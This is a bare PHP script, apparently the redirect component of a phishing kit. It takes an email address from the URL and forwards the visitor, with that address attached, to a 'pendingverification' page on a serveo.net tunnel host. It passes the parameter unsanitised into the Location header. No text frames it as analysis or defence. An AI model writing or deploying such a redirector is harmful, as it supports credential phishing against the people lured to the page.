<?php
 $site = "https://pendingverification.serveo.net/go";
 $email = $_GET['var'];
  header("Location: ".$site."/index.php?email=".$email."");
  exit;
?>
